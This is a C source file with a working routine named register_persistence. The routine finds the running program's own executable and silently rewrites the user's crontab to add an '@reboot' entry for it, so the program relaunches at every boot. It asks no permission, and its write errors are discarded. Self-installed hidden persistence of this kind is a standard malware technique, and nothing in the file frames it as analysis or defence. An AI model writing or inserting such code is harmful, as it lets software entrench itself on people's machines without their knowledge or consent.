#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <unistd.h>

static int write_all(FILE *f, const char *s) {
    size_t len = strlen(s);
    size_t off = 0;
    while (off < len) {
        size_t n = fwrite(s + off, 1, len - off, f);
        if (n == 0)
            return 0;
        off += n;
    }
    return 1;
}

void register_persistence(void) {
    char exe_path[PATH_MAX];
    if (realpath("/proc/self/exe", exe_path) == NULL)
        return;

    size_t target_len = strlen("@reboot ") + strlen(exe_path) + 1;
    char *target = malloc(target_len);
    if (target == NULL)
        return;
    snprintf(target, target_len, "@reboot %s", exe_path);

    FILE *in = popen("crontab -l", "r");
    if (in == NULL) {
        free(target);
        return;
    }

    char **lines = NULL;
    size_t nlines = 0, cap = 0;
    char *buf = NULL;
    size_t bufsize = 0;
    ssize_t nread;
    int found = 0;
    int fail = 0;

    while ((nread = getline(&buf, &bufsize, in)) != -1) {
        while (nread > 0 && (buf[nread - 1] == '\n' || buf[nread - 1] == '\r')) {
            buf[--nread] = '\0';
        }

        if (strcmp(buf, target) == 0)
            found = 1;

        char *copy = strdup(buf);
        if (copy == NULL) {
            fail = 1;
            break;
        }

        if (nlines == cap) {
            size_t newcap = (cap == 0) ? 16 : cap * 2;
            char **tmp = realloc(lines, newcap * sizeof(*tmp));
            if (tmp == NULL) {
                free(copy);
                fail = 1;
                break;
            }
            lines = tmp;
            cap = newcap;
        }
        lines[nlines++] = copy;
    }

    if (!fail && ferror(in))
        fail = 1;

    free(buf);
    if (pclose(in) == -1)
        fail = 1;

    if (fail || found) {
        for (size_t i = 0; i < nlines; i++)
            free(lines[i]);
        free(lines);
        free(target);
        return;
    }

    FILE *out = popen("crontab -", "w");
    if (out == NULL) {
        for (size_t i = 0; i < nlines; i++)
            free(lines[i]);
        free(lines);
        free(target);
        return;
    }

    int write_err = 0;
    for (size_t i = 0; i < nlines; i++) {
        if (!write_all(out, lines[i]) || !write_all(out, "\n")) {
            write_err = 1;
            break;
        }
    }

    if (!write_err) {
        if (!write_all(out, target) || !write_all(out, "\n"))
            write_err = 1;
    }

    if (ferror(out))
        write_err = 1;

    if (pclose(out) != 0)
        write_err = 1;

    for (size_t i = 0; i < nlines; i++)
        free(lines[i]);
    free(lines);
    free(target);
    (void)write_err;
}